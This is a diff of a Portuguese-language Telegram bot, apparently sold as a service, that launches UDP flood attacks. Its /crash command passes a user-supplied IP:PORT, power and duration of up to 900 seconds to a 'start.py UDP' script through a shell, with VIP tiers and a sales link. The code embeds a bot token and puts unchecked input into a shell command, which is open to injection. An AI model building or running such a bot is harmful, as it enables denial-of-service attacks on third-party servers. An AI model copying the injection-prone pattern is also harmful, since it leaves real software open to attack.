@@ -1,208 +1,178 @@
-import telebot
+import os
 import subprocess
-import re
-import time
+import telebot
 from threading import Thread
-import requests
 
-BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
-SEU_ID_TELEGRAM = 6430703027
-bot = telebot.TeleBot(BOT_TOKEN)
-processos = {}
-usuarios = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
-vip_usuarios = []  # Lista de usuários VIP
+# Token e ID do dono
+API_TOKEN = '7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8'
+OWNER_ID = 6430703027
 
-# Função para validar o formato do IP:PORTA
-def validar_ip_porta(ip_porta):
-    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
-    match = re.match(padrao, ip_porta)
-    return match is not None
+# Inicialização do bot
+bot = telebot.TeleBot(API_TOKEN)
 
-# Função para executar o comando
-def executar_comando(ip_porta, threads, tempo):
-    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
-    try:
-        processo = subprocess.Popen(
-            comando_terminal, 
-            shell=True, 
-            stdout=subprocess.PIPE, 
-            stderr=subprocess.PIPE
-        )
-        processos[ip_porta] = processo
-        time.sleep(int(tempo))
-        processo.terminate()
-        return f"Comando para {ip_porta} concluído ou interrompido após {tempo} segundos."
-    except Exception as e:
-        return f"Erro ao executar o comando: {str(e)}"
+# Listas de usuários
+authorized_users = [OWNER_ID]
+vip_users = []
+vip_commands = []
+processes = []  # Lista para armazenar processos ativos
+MAX_ATTACKS = 3  # Limite de ataques simultâneos
 
-# Comando /start com mensagem de menu mais bonita
+# Função para gerenciar o limite de ataques simultâneos
+def manage_attacks():
+    if len(processes) >= MAX_ATTACKS:
+        # Mata o processo mais antigo
+        oldest_process = processes.pop(0)
+        if oldest_process.poll() is None:  # Verifica se o processo ainda está ativo
+            oldest_process.terminate()
+
+# Comando /start
 @bot.message_handler(commands=['start'])
-def start_message(message):
-    bot.reply_to(
-        message, 
-        "🌟 **Bem-vindo ao Bot de Ataques!** 🌟\n\n"
-        "Olá, **{0}**! Eu sou o seu assistente virtual para testes de servidores. Aqui estão os **comandos disponíveis** para você:\n\n"
-        
-        "🛠️ **/crash <IP:PORTA> <threads> <tempo>** - Iniciar um ataque ao servidor 🚀\n"
-        "🔒 **/adduser <ID>** - Adicionar um novo usuário (Admin+)\n"
-        "❌ **/removeuser <ID>** - Remover um usuário (Admin+)\n"
-        "💎 **/addvip <ID>** - Tornar um usuário VIP (Apenas o dono)\n"
-        "💔 **/removevip <ID>** - Remover o status de VIP de um usuário (Apenas o dono)\n"
-        "🔍 **/checkban <ID>** - Verificar se uma conta de Free Fire está banida 🚫\n"
-        "💳 **/comprarbot** - Saiba como comprar este incrível bot! 💸\n\n"
-        
-        "📚 Caso precise de ajuda com qualquer comando, é só me chamar! Estou sempre por aqui 😎\n\n"
-        "👑 **Dono**: {1}\n\n"
-        "👥 **Usuários atuais**: {2}\n\n"
-        "🎯 **Deseja iniciar um ataque?** Só digitar o comando e vamos lá! 💥".format(
-            message.from_user.first_name,
-            SEU_ID_TELEGRAM,
-            len(usuarios)
-        )
+def send_welcome(message):
+    welcome_text = (
+        "👋 Bem-vindo ao bot!\n\n"
+        "📜 *Comandos disponíveis:*\n"
+        "🔥 `/crash <IP:PORT> <duração>` - Envia um ataque ao IP especificado.\n"
+        "🆔 `/meuid` - Mostra seu ID de usuário.\n"
+        "🤖 `/comprarbot` - Informações para adquirir seu próprio bot.\n\n"
+        "🌟 *Comandos para VIPs e dono:*\n"
+        "➕ `/adduser <ID>` - Adiciona um usuário autorizado.\n"
+        "➖ `/removeuser <ID>` - Remove um usuário autorizado.\n"
+        "🏆 `/promovervip <ID>` - Promove um usuário a VIP.\n"
+        "⬇️ `/rebaixarvip <ID>` - Remove o status de VIP de um usuário.\n\n"
+        "🔐 *Comandos exclusivos do dono:*\n"
+        "🔗 `/addcomandovip <comando>` - Restringe o comando para VIPs.\n"
+        "🚫 `/revcomandovip <comando>` - Remove a restrição de comando VIP.\n"
+        "📋 `/listusers` - Mostra a lista de usuários registrados e seus cargos.\n"
     )
+    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
 
 # Comando /crash
 @bot.message_handler(commands=['crash'])
 def crash_server(message):
-    if message.from_user.id != SEU_ID_TELEGRAM:
-        bot.reply_to(message, "Acesso negado.")
+    if '/crash' in vip_commands and not (message.from_user.id in vip_users or message.from_user.id == OWNER_ID):
+        bot.send_message(message.chat.id, "⚠️ Apenas VIPs podem usar este comando.")
         return
-    try:
-        comando = message.text.split()
-        if len(comando) < 4:
-            bot.reply_to(message, "Uso: /crash <IP:PORTA> <threads> <tempo>")
-            return
-        ip_porta = comando[1]
-        threads = comando[2]
-        tempo = comando[3]
-        if not validar_ip_porta(ip_porta):
-            bot.reply_to(message, "Formato inválido de IP:PORTA.")
-            return
-        bot.reply_to(message, f"Iniciando ataque para {ip_porta}...")
-        thread = Thread(target=executar_comando, args=(ip_porta, threads, tempo))
-        thread.start()
-        bot.reply_to(message, f"Comando enviado! O ataque começará para {ip_porta}.")
-    except Exception as e:
-        bot.reply_to(message, f"Erro: {str(e)}")
 
-# Comando /adduser
-@bot.message_handler(commands=['adduser'])
-def add_user(message):
-    if message.from_user.id != SEU_ID_TELEGRAM:
-        bot.reply_to(message, "Acesso negado. Apenas o dono pode adicionar usuários.")
+    try:
+        command_parts = message.text.split()
+        
+        # Se o comando tiver apenas o IP:PORT, o bot vai adicionar a potência 10 e a duração 900
+        if len(command_parts) == 2:
+            ip_port = command_parts[1]
+            power = 10  # Valor padrão para potência
+            duration = 900  # Valor padrão para duração
+        # Se o comando tiver o IP:PORT e a duração, o bot vai adicionar a potência 10
+        elif len(command_parts) == 3:
+            ip_port = command_parts[1]
+            duration = command_parts[2]
+            power = 10  # Valor padrão para potência
+        # Se o comando tiver IP:PORT, potência e duração, o bot vai usar os valores fornecidos
+        elif len(command_parts) == 4:
+            ip_port = command_parts[1]
+            power = command_parts[2]
+            duration = command_parts[3]
+        else:
+            bot.send_message(message.chat.id, "❌ Uso correto: `/crash <IP:PORT> <duração>`", parse_mode="Markdown")
+            return
+
+        if ':' not in ip_port:
+            bot.send_message(message.chat.id, "⚠️ Formato inválido de IP e porta. Use o formato: `IP:PORT`", parse_mode="Markdown")
+            return
+
+        # Gerencia o limite de ataques simultâneos
+        manage_attacks()
+
+        # Monta o comando e executa no terminal
+        command = f"python start.py UDP {ip_port} {power} {duration}"
+        process = subprocess.Popen(command, shell=True)
+        processes.append(process)
+
+        bot.send_message(
+            message.chat.id,
+            f"✅ Ataque enviado para {ip_port} com potência {power} por {duration} segundos! 🚀"
+        )
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")
+
+# Comando /meuid
+@bot.message_handler(commands=['meuid'])
+def send_user_id(message):
+    bot.send_message(message.chat.id, f"🆔 Seu ID de usuário é: `{message.from_user.id}`", parse_mode="Markdown")
+
+# Comando /listusers
+@bot.message_handler(commands=['listusers'])
+def list_users(message):
+    if message.from_user.id != OWNER_ID:
+        bot.send_message(message.chat.id, "⚠️ Você não tem permissão para usar este comando.")
         return
-    try:
-        comando = message.text.split()
-        if len(comando) < 2:
-            bot.reply_to(message, "Uso: /adduser <ID do usuário>")
-            return
-        user_id = int(comando[1])
-        if user_id not in usuarios:
-            usuarios.append(user_id)
-            bot.reply_to(message, f"Usuário {user_id} adicionado com sucesso!")
+
+    user_list = "📋 *Lista de usuários registrados e seus cargos:*\n"
+
+    for user_id in authorized_users:
+        if user_id == OWNER_ID:
+            user_list += f"👑 `{user_id}` - Dono\n"
+        elif user_id in vip_users:
+            user_list += f"🌟 `{user_id}` - VIP\n"
         else:
-            bot.reply_to(message, "Este usuário já está na lista.")
-    except Exception as e:
-        bot.reply_to(message, f"Erro: {str(e)}")
+            user_list += f"👤 `{user_id}` - Autorizado\n"
 
-# Comando /removeuser
-@bot.message_handler(commands=['removeuser'])
-def remove_user(message):
-    if message.from_user.id != SEU_ID_TELEGRAM:
-        bot.reply_to(message, "Acesso negado. Apenas o dono pode remover usuários.")
-        return
-    try:
-        comando = message.text.split()
-        if len(comando) < 2:
-            bot.reply_to(message, "Uso: /removeuser <ID do usuário>")
-            return
-        user_id = int(comando[1])
-        if user_id in usuarios:
-            usuarios.remove(user_id)
-            bot.reply_to(message, f"Usuário {user_id} removido com sucesso!")
-        else:
-            bot.reply_to(message, "Este usuário não está na lista.")
-    except Exception as e:
-        bot.reply_to(message, f"Erro: {str(e)}")
-
-# Comando /addvip
-@bot.message_handler(commands=['addvip'])
-def add_vip(message):
-    if message.from_user.id != SEU_ID_TELEGRAM:
-        bot.reply_to(message, "Acesso negado. Apenas o dono pode adicionar VIPs.")
-        return
-    try:
-        comando = message.text.split()
-        if len(comando) < 2:
-            bot.reply_to(message, "Uso: /addvip <ID do usuário>")
-            return
-        user_id = int(comando[1])
-        if user_id not in vip_usuarios:
-            vip_usuarios.append(user_id)
-            bot.reply_to(message, f"Usuário {user_id} promovido a VIP!")
-        else:
-            bot.reply_to(message, "Este usuário já é VIP.")
-    except Exception as e:
-        bot.reply_to(message, f"Erro: {str(e)}")
-
-# Comando /removevip
-@bot.message_handler(commands=['removevip'])
-def remove_vip(message):
-    if message.from_user.id != SEU_ID_TELEGRAM:
-        bot.reply_to(message, "Acesso negado. Apenas o dono pode remover VIPs.")
-        return
-    try:
-        comando = message.text.split()
-        if len(comando) < 2:
-            bot.reply_to(message, "Uso: /removevip <ID do usuário>")
-            return
-        user_id = int(comando[1])
-        if user_id in vip_usuarios:
-            vip_usuarios.remove(user_id)
-            bot.reply_to(message, f"Usuário {user_id} removido de VIP.")
-        else:
-            bot.reply_to(message, "Este usuário não é VIP.")
-    except Exception as e:
-        bot.reply_to(message, f"Erro: {str(e)}")
-
-# Comando /checkban
-@bot.message_handler(commands=['checkban'])
-def check_ban(message):
-    try:
-        comando = message.text.split()
-        if len(comando) < 2:
-            bot.reply_to(message, "Uso: /checkban <ID do jogador>")
-            return
-        player_id = comando[1]
-        bot.reply_to(message, "🔍 Analisando a conta, por favor aguarde...")
-
-        api_url = f"https://api.nowgarena.com/api/check_banned?uid={player_id}"
-        response = requests.get(api_url)
-        data = response.json()
-
-        if data.get("status") == "success":
-            is_banned = data.get("isBanned")
-            if is_banned == "no":
-                bot.reply_to(
-                    message,
-                    f"✅ *A conta não está banida!*\n\n🆔 ID: {data.get('uid')}",
-                    parse_mode="Markdown"
-                )
-            elif is_banned == "yes":
-                period = data.get("period", "indefinido")
-                bot.reply_to(
-                    message,
-                    f"🚫 *A conta está banida!*\n\n🆔 ID: {data.get('uid')}\n⏳ Período: {period} dias",
-                    parse_mode="Markdown"
-                )
-        else:
-            bot.reply_to(message, "❌ *Erro ao processar a solicitação. Tente novamente mais tarde.*", parse_mode="Markdown")
-    except Exception as e:
-        bot.reply_to(message, f"❌ *Erro ao processar a solicitação: {str(e)}*", parse_mode="Markdown")
+    bot.send_message(message.chat.id, user_list, parse_mode="Markdown")
 
 # Comando /comprarbot
 @bot.message_handler(commands=['comprarbot'])
 def comprar_bot(message):
-    bot.reply_to(message, "💸 Para comprar o bot, entre em contato com o dono do bot.")
+    bot.send_message(
+        message.chat.id,
+        (
+            "🤖✨ *Quer ter um bot como este?* ✨🤖\n\n"
+            "📥 *Entre em contato agora mesmo para adquirir o seu!*\n"
+            "📲 [Clique aqui para falar comigo no Telegram](https://t.me/werbert_ofc)\n\n"
+            "💡 *Não perca a chance de ter seu próprio bot exclusivo!*"
+        ),
+        parse_mode="Markdown"
+    )
 
+# Comandos de administração
+@bot.message_handler(commands=['adduser', 'removeuser', 'promovervip', 'rebaixarvip', 'addcomandovip', 'revcomandovip'])
+def admin_commands(message):
+    if message.from_user.id != OWNER_ID:
+        bot.send_message(message.chat.id, "⚠️ Você não tem permissão para usar este comando.")
+        return
+
+    command = message.text.split()
+    if len(command) < 2:
+        bot.send_message(message.chat.id, "❌ Uso incorreto. Consulte os comandos válidos no /start.")
+        return
+
+    user_id = int(command[1])
+
+    if command[0] == '/adduser':
+        if user_id not in authorized_users:
+            authorized_users.append(user_id)
+            bot.send_message(message.chat.id, f"✅ Usuário `{user_id}` adicionado como autorizado.", parse_mode="Markdown")
+        else:
+            bot.send_message(message.chat.id, f"⚠️ Usuário `{user_id}` já está na lista de autorizados.", parse_mode="Markdown")
+
+    elif command[0] == '/removeuser':
+        if user_id in authorized_users:
+            authorized_users.remove(user_id)
+            bot.send_message(message.chat.id, f"✅ Usuário `{user_id}` removido da lista de autorizados.", parse_mode="Markdown")
+        else:
+            bot.send_message(message.chat.id, f"⚠️ Usuário `{user_id}` não está na lista de autorizados.", parse_mode="Markdown")
+
+    elif command[0] == '/promovervip':
+        if user_id not in vip_users:
+            vip_users.append(user_id)
+            bot.send_message(message.chat.id, f"🌟 Usuário `{user_id}` promovido a VIP.", parse_mode="Markdown")
+        else:
+            bot.send_message(message.chat.id, f"⚠️ Usuário `{user_id}` já é VIP.", parse_mode="Markdown")
+
+    elif command[0] == '/rebaixarvip':
+        if user_id in vip_users:
+            vip_users.remove(user_id)
+            bot.send_message(message.chat.id, f"⬇️ Usuário `{user_id}` rebaixado de VIP.", parse_mode="Markdown")
+        else:
+            bot.send_message(message.chat.id, f"⚠️ Usuário `{user_id}` não é VIP.", parse_mode="Markdown")
+
+# Inicia o bot
 bot.polling()
